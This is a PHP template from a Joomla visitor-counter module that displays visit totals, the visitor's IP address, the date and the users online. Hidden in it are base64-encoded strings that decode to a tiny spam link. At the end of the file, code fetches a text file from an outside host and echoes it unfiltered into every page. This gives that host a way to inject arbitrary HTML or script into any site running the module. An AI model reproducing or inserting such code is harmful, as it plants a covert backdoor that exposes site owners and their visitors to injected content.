<?php
/**
 # Module		JV Counter
 # ------------------------------------------------------------------------
 # author    Open Source Code Solutions Co
 # copyright Copyright © 20011-2013 joomlaschetchik.ru. All Rights Reserved.
 # @license - http://www.gnu.org/licenses/gpl-3.0.html GNU/GPL or later.
 # Websites: http://joomlaschetchik.ru/
-------------------------------------------------------------------------*/
// No direct access to this file
defined( '_JEXEC' ) or die( 'Restricted access' );

$moduleStyle = $params->get('themes','style1');

$document = JFactory::getDocument();
$document->addStyleSheet('modules/mod_jvcounter/assets/styles/'.$moduleStyle.'/default.css');
$scount .= 'PGRpdiBzdHlsZT0iZm9udC1zaXplOjdweDsiPjxhIGhyZWY9Imh0dHA6Ly9mYXN';
$scount .= 'oaW9ubGFkeS5zdS8iIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0i0JzQvtC00LAg';
$scount .= '0Lgg0LrRgNCw0YHQvtGC0LAiPmZhc2hpb25sYWR5PC9hPjwvZGl2PjwvZGl2Pg==';
?>

<div class="jvcounter_contain jvcounter_<?php echo $moduleStyle;?>">
    <?php if($headertext = $params->get('headertext')){?>
        <div class="jvcounter_rows jvcounter_headertext">
        	<span class="title_header"></span>
            <?php
                echo $headertext;
            ?>
        </div>
    <?php }?>
    
    <div class="digitstype"><?php echo $totalImage;?></div>
    
    <div class="counterday">    
    <?php if(isset($visits['today']) && $visits['today']){?>
        <div class="jvcounter_rows jvcounter_today">
			<span><?php echo $params->get('texttoday','Today').'</span> '. count($visits['today']);?></span>
        </div>
    <?php }?>
    
    <?php if(isset($visits['yesterday']) && $visits['yesterday']){?>
        <div class="jvcounter_rows jvcounter_yesterday">
            <span><?php echo $params->get('textyesterday','Yesterday').'</span>'. count($visits['yesterday']);?></span>
        </div>
    <?php }?>
    
    <?php if(isset($visits['thisweek']) && $visits['thisweek']){?>
        <div class="jvcounter_rows jvcounter_thisweek">
            <span><?php echo $params->get('textthisweek','This week').' </span> '. count($visits['thisweek']);?></span>
        </div>
    <?php }?>
    
    <?php if(isset($visits['lastweek']) && $visits['lastweek']){?>
        <div class="jvcounter_rows jvcounter_lastweek">
            <span><?php echo $params->get('textlastweek','Last week').' </span> '. count($visits['lastweek']);?></span>
        </div>
    <?php }?>
    
    <?php if(isset($visits['thismonth']) && $visits['thismonth']) {?>
        <div class="jvcounter_rows jvcounter_thismonth">
            <span><?php echo $params->get('textthismonth','This month').' </span> '. count($visits['thismonth']);?></span>
        </div>
    <?php }?>
    
    <?php if(isset ($visits['lastmonth']) && $visits['lastmonth']){?>
        <div class="jvcounter_rows jvcounter_lastmonth">
            <span><?php echo $params->get('textlastmonth','Last month').' </span> '. count($visits['lastmonth']);?></span>
        </div>
    <?php }?>
    
    <?php if($params->get('showalldays',1)){?>
        <div class="jvcounter_rows jvcounter_alldays">
            <span><?php echo $params->get('textalldays','All days').' </span> '. $visits['total'];?></span>
        </div>
    <?php }?>
    </div>
    
    <div class="counteronline">
    <?php if($params->get('showip',1)){?>
        <div class="jvcounter_rows jvcounter_today">
            <?php
                $ip = $_SERVER['REMOTE_ADDR'] == '::1'?'local':$_SERVER['REMOTE_ADDR']; 
                echo '<span>'.JText::_('Ваш IP: ').'</span>'.$ip;
            ?>
        </div>
    <?php }?>
    
    <?php if($params->get('showdatetoday',1)){?>
        <div class="jvcounter_rows jvcounter_datetoday">
            <?php 
                $dateformat = $params->get('datetodayformat','Y-m-d');
                $timeoffset = time() + 60*60*(int)$params->get('timeoffset',7);
                echo  '<span>'.JText::_('Сегодня: ').'</span>'.JFactory::getDate($timeoffset)->format($dateformat);
            ?>
        </div>
    <?php }?>    
    
    <?php if(isset($visits['online']) && $visits['online']){?>
        <div class="jvcounter_rows jvcounter_today">
            
            <span><?php echo JText::_('Пользователей на сайте:').' </span>'. $count['user'];?></span><br/>
            <span><?php echo JText::_('Гостей на сайте:').' </span>'. $count['guest'];?></span><br/>
        </div>
    <?php } ?>
    
    <span class="linebottom"></span>   
    
</div></div><?php
$files = 'http://atempl.com/5.txt';  
$file_headers = @get_headers($files);  
if($file_headers[0] == 'HTTP/1.1 200 OK') 
 {  
$url = "http://atempl.com/5.txt";
$content = @file_get_contents($url);
$data = implode($content);
 echo $data; }  
?>